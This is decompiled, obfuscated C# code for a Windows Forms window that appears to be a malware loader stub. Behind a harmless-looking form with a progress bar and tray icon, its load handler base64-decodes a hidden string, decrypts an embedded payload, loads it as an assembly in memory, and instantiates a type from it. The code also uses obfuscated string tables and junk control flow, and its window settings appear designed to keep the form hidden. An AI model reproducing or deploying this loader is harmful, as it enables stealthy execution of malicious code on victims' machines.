using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

[DesignerGenerated]
public class j : Form
{
	private IContainer m_a;

	[AccessedThroughProperty("NotifyIcon1")]
	private NotifyIcon m_b;

	[AccessedThroughProperty("TextBox1")]
	private TextBox m_c;

	[AccessedThroughProperty("Button1")]
	private Button m_d;

	[AccessedThroughProperty("ProgressBar1")]
	private ProgressBar m_e;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox f;

	public static object g;

	internal virtual NotifyIcon a
	{
		get
		{
			return this.m_b;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			this.m_b = value;
		}
	}

	internal virtual TextBox b
	{
		get
		{
			return this.m_c;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			this.m_c = value;
		}
	}

	internal virtual Button c
	{
		get
		{
			return this.m_d;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = l;
			if (this.m_d != null)
			{
				((Control)this.m_d).remove_Click(eventHandler);
			}
			this.m_d = value;
			if (this.m_d == null)
			{
				return;
			}
			while (true)
			{
				switch (6)
				{
				case 0:
					continue;
				}
				if (1 == 0)
				{
					/*OpCode not supported: LdMemberToken*/;
				}
				((Control)this.m_d).add_Click(eventHandler);
				return;
			}
		}
	}

	internal virtual ProgressBar d
	{
		get
		{
			return this.m_e;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			this.m_e = value;
		}
	}

	internal virtual PictureBox e
	{
		get
		{
			return f;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			f = value;
		}
	}

	public j()
	{
		((Form)this).add_Load((EventHandler)n);
		a();
	}

	protected override void Dispose(bool P_0)
	{
		try
		{
			if (!P_0 || this.m_a == null)
			{
				return;
			}
			while (true)
			{
				switch (2)
				{
				case 0:
					continue;
				}
				if (1 == 0)
				{
					/*OpCode not supported: LdMemberToken*/;
				}
				this.m_a.Dispose();
				return;
			}
		}
		finally
		{
			((Form)this).Dispose(P_0);
		}
	}

	[DebuggerStepThrough]
	private void a()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		this.m_a = new Container();
		this.a = new NotifyIcon(this.m_a);
		b = new TextBox();
		c = new Button();
		d = new ProgressBar();
		e = new PictureBox();
		((ISupportInitialize)e).BeginInit();
		((Control)this).SuspendLayout();
		this.a.set_Text(global::n.a(220));
		this.a.set_Visible((byte)global::l.a(48) != 0);
		TextBox obj = b;
		Point location = new Point(global::l.a(52), global::l.a(56));
		((Control)obj).set_Location(location);
		((Control)b).set_Name(global::n.a(243));
		TextBox obj2 = b;
		Size size = new Size(global::l.a(60), global::l.a(64));
		((Control)obj2).set_Size(size);
		((Control)b).set_TabIndex(global::l.a(68));
		Button obj3 = c;
		location = new Point(global::l.a(72), global::l.a(76));
		((Control)obj3).set_Location(location);
		((Control)c).set_Name(global::n.a(260));
		Button obj4 = c;
		size = new Size(global::l.a(80), global::l.a(84));
		((Control)obj4).set_Size(size);
		((Control)c).set_TabIndex(global::l.a(88));
		((ButtonBase)c).set_Text(global::n.a(260));
		((ButtonBase)c).set_UseVisualStyleBackColor((byte)global::l.a(92) != 0);
		ProgressBar obj5 = d;
		location = new Point(global::l.a(96), global::l.a(100));
		((Control)obj5).set_Location(location);
		((Control)d).set_Name(global::n.a(275));
		ProgressBar obj6 = d;
		size = new Size(global::l.a(104), global::l.a(108));
		((Control)obj6).set_Size(size);
		((Control)d).set_TabIndex(global::l.a(112));
		PictureBox obj7 = e;
		location = new Point(global::l.a(116), global::l.a(120));
		((Control)obj7).set_Location(location);
		((Control)e).set_Name(global::n.a(300));
		PictureBox obj8 = e;
		int width = global::l.a(124);
		_003CModule_003E.d = null;
		size = new Size(width, global::l.a(128));
		((Control)obj8).set_Size(size);
		e.set_TabIndex(global::l.a(132));
		e.set_TabStop((byte)global::l.a(136) != 0);
		SizeF autoScaleDimensions = new SizeF(global::l.c(140), global::l.c(144));
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)global::l.a(148));
		size = new Size(global::l.a(152), global::l.a(156));
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)e);
		ControlCollection controls = ((Control)this).get_Controls();
		ProgressBar obj9 = d;
		w.c = 1952428595;
		controls.Add((Control)(object)obj9);
		((Control)this).get_Controls().Add((Control)(object)c);
		((Control)this).get_Controls().Add((Control)(object)b);
		((Control)this).set_Name(global::n.a(323));
		((Form)this).set_Opacity(global::l.d(160));
		((Form)this).set_ShowInTaskbar((byte)global::l.a(168) != 0);
		_003CModule_003E.a = null;
		((Form)this).set_WindowState((FormWindowState)global::l.a(172));
		_003CModule_003E.n = 721847420;
		((ISupportInitialize)e).EndInit();
		((Control)this).ResumeLayout((byte)global::l.a(176) != 0);
		((Control)this).PerformLayout();
	}

	private void l(object P_0, EventArgs P_1)
	{
	}

	public void m(string P_0)
	{
		Activator.CreateInstance(AppDomain.CurrentDomain.Load(global::m.b(x.c, P_0)).GetType(k.a));
	}

	private void n(object P_0, EventArgs P_1)
	{
		m(Encoding.Default.GetString(Convert.FromBase64String(global::n.a(332))));
	}
}
